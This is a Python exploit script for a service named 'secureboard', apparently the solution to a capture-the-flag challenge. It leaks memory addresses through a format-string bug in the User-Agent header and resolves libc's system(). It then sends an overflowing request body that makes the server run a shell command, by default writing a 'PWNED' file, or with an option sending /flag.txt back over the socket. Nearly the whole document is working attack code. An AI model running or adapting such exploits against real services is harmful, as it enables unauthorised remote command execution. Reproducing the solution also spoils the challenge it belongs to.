#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import subprocess
import time
from pathlib import Path


DEFAULT_CMD = "sh -c 'echo PWNED > owned'"
DEFAULT_FLAG_PATH = "/flag.txt"
PIE_RET_OFFSET = 0x1674F
FSB_LEAK_RE = re.compile(
    rb"X-Debug-Info: LEAK:(0x[0-9a-f]+)\|(0x[0-9a-f]+)\|(0x[0-9a-f]+)\|(0x[0-9a-f]+|\(nil\))"
)


def find_listener_pid(port: int) -> int:
    out = subprocess.check_output(
        ["ss", "-ltnp", f"( sport = :{port} )"], text=True
    )
    match = re.search(r'users:\(\("secureboard",pid=(\d+),fd=\d+\)\)', out)
    if not match:
        raise SystemExit(f"secureboard is not listening on :{port}")
    return int(match.group(1))


def parse_maps(pid: int):
    maps = Path(f"/proc/{pid}/maps").read_text().splitlines()
    bin_base = None
    arena_base = None
    libc_base = None
    libc_path = None

    for line in maps:
        parts = line.split()
        addr_range, perms, offset = parts[:3]
        path = parts[-1] if len(parts) >= 6 else ""
        start = int(addr_range.split("-")[0], 16)

        if path.endswith("/secureboard") and offset == "00000000":
            bin_base = start
        elif path.endswith("libc.so.6") and offset == "00000000":
            libc_base = start
            libc_path = path
        elif len(parts) >= 6 and parts[-2:] == ["/dev/zero", "(deleted)"]:
            end = int(addr_range.split("-")[1], 16)
            if perms.startswith("rw") and end - start == 0x10000:
                arena_base = start

    if bin_base is None or libc_base is None or libc_path is None or arena_base is None:
        raise SystemExit("failed to recover secureboard/libc/arena mappings")

    return bin_base, libc_base, libc_path, arena_base


def lookup_symbol(libc_path: str, symbol: str) -> int:
    out = subprocess.check_output(["nm", "-D", libc_path], text=True, errors="replace")
    for line in out.splitlines():
        fields = line.split()
        if len(fields) < 3:
            continue
        value, _, name = fields[:3]
        if name == symbol or name.startswith(f"{symbol}@"):
            return int(value, 16)
    raise SystemExit(f"failed to resolve {symbol} from {libc_path}")


def verify_artifact(pid: int, name: str, timeout: float = 1.0):
    cwd = Path(Path(f"/proc/{pid}/cwd").resolve())
    target = cwd / name
    deadline = time.time() + timeout

    while time.time() < deadline:
        if target.exists():
            print(f"[+] verified   = {target}")
            try:
                content = target.read_text(errors="replace").strip()
            except OSError as exc:
                print(f"[+] read error  = {exc}")
            else:
                print(f"[+] content    = {content!r}")
            return
        time.sleep(0.05)

    print(f"[-] verify miss = {target}")


def recv_all(sock: socket.socket) -> bytes:
    chunks = []
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def post_raw(host: str, port: int, path: bytes, body: bytes) -> bytes:
    req = (
        b"POST "
        + path
        + b" HTTP/1.1\r\nHost: localhost\r\nContent-Length: "
        + str(len(body)).encode()
        + b"\r\n\r\n"
        + body
    )
    with socket.create_connection((host, port)) as sock:
        sock.sendall(req)
        return recv_all(sock)


def get_raw(host: str, port: int, path: bytes, headers: list[bytes]) -> bytes:
    req = b"GET " + path + b" HTTP/1.1\r\nHost: localhost\r\n"
    for header in headers:
        req += header + b"\r\n"
    req += b"\r\n"
    with socket.create_connection((host, port)) as sock:
        sock.sendall(req)
        return recv_all(sock)


def leak_runtime(host: str, port: int):
    resp = get_raw(
        host,
        port,
        b"/msg/0",
        [b"X-Debug: 1", b"User-Agent: LEAK:%p|%p|%p|%p"],
    )
    match = FSB_LEAK_RE.search(resp)
    if not match:
        raise SystemExit("failed to recover runtime leaks via X-Debug/User-Agent format string")

    atoll_addr = int(match.group(1), 16)
    pie_ret = int(match.group(2), 16)
    arena_base = int(match.group(3), 16)
    arena_ptr = None if match.group(4) == b"(nil)" else int(match.group(4), 16)
    pie_base = pie_ret - PIE_RET_OFFSET

    return {
        "response": resp,
        "atoll": atoll_addr,
        "pie_ret": pie_ret,
        "pie_base": pie_base,
        "arena_base": arena_base,
        "arena_ptr": arena_ptr,
    }


def extract_pre_http(data: bytes) -> bytes:
    marker = b"HTTP/1.1 "
    idx = data.find(marker)
    if idx <= 0:
        return b""
    return data[:idx]


def format_flag_command(path: str, fd: int) -> str:
    return f"sh -c 'cat {path} >&{fd}'"


def main():
    parser = argparse.ArgumentParser(description="Exploit for secureboard")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--pid", type=int, help="secureboard pid; auto-detects from ss when available")
    parser.add_argument("--libc", default="libc.so.6", help="libc used for symbol offsets when /proc maps are unavailable")
    parser.add_argument("--cmd", default=DEFAULT_CMD, help="command string for system()")
    parser.add_argument("--flag", action="store_true", help="send the flag to the client socket instead of using --cmd")
    parser.add_argument("--fd", type=int, default=4, help="socket fd used by --flag")
    parser.add_argument("--flag-path", default=DEFAULT_FLAG_PATH, help="path read by --flag")
    args = parser.parse_args()

    cmd = args.cmd
    if args.flag:
        cmd = format_flag_command(args.flag_path, args.fd)

    if "\x00" in cmd:
        raise SystemExit("command cannot contain NUL bytes")
    if len(cmd.encode()) > 0x50:
        raise SystemExit("command must be <= 0x50 bytes")

    pid = None
    try:
        pid = args.pid or find_listener_pid(args.port)
    except SystemExit:
        pass

    leak = leak_runtime(args.host, args.port)
    arena_base = leak["arena_base"]
    cmd_addr = arena_base + 0x60

    libc_path = args.libc
    libc_base = None
    if pid is not None:
        _, libc_base, runtime_libc_path, mapped_arena = parse_maps(pid)
        libc_path = runtime_libc_path
        if mapped_arena != arena_base:
            raise SystemExit("format-string arena leak did not match /proc maps")

    atoll_off = lookup_symbol(libc_path, "atoll")
    system_off = lookup_symbol(libc_path, "system")
    if libc_base is None:
        libc_base = leak["atoll"] - atoll_off
    system_addr = libc_base + system_off

    if pid is not None:
        print(f"[+] pid        = {pid}")
    print(f"[+] libc       = {libc_path}")
    print(f"[+] libc base  = {hex(libc_base)}")
    print(f"[+] atoll      = {hex(leak['atoll'])}")
    print(f"[+] pie base   = {hex(leak['pie_base'])}")
    if leak["arena_ptr"] is not None:
        print(f"[+] arena ptr  = {hex(leak['arena_ptr'])}")
    print(f"[+] arena base = {hex(arena_base)}")
    print(f"[+] system     = {hex(system_addr)}")
    print(f"[+] cmd addr   = {hex(cmd_addr)}")

    stage = post_raw(args.host, args.port, b"/msg/0", cmd.encode())
    print(f"[+] staged command: {stage.splitlines()[-1].decode(errors='replace')}")

    body = bytearray(b"A" * 0x220)
    body[0x200:0x208] = b"B" * 8
    body[0x208:0x20C] = struct.pack("<I", 0)
    body[0x20C:0x210] = b"C" * 4
    body[0x210:0x218] = struct.pack("<Q", system_addr)
    body[0x218:0x220] = struct.pack("<Q", cmd_addr)

    resp = post_raw(args.host, args.port, b"/msg/1", body)
    prefix = extract_pre_http(resp)
    if prefix.strip():
        print(f"[+] pre-http   = {prefix.decode(errors='replace').strip()!r}")

    lines = resp.splitlines()
    if lines:
        print(f"[+] exploit response: {lines[-1].decode(errors='replace')}")
    else:
        print("[+] exploit response: (empty)")

    if args.flag and prefix.strip():
        print(f"[+] flag       = {prefix.decode(errors='replace').strip()}")

    if cmd == DEFAULT_CMD and pid is not None:
        verify_artifact(pid, "owned")


if __name__ == "__main__":
    main()
